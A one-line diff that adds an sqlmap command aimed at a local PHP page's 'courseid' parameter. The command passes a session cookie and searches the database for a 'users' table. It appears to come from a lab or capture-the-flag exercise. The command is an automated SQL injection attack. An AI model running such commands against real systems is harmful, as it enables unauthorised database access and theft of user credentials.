@@ -1,0 +1,1 @@
+sqlmap -u 'http://localhost:30000/participants.php?courseid=5' --cookie='PHPSESSID=e04gtr2p1smjv63qiu1l7dkku7' --search -T users --batch
